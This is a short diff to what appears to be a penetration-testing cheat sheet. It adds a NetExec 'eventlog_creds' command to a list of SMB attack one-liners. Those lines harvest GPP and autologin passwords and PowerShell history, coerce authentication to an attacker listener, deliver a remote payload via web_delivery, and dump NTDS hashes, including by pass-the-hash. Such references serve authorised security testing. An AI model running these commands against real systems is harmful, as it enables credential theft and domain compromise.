@@ -727,6 +727,7 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=htt
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M eventlog_creds
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
 $ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
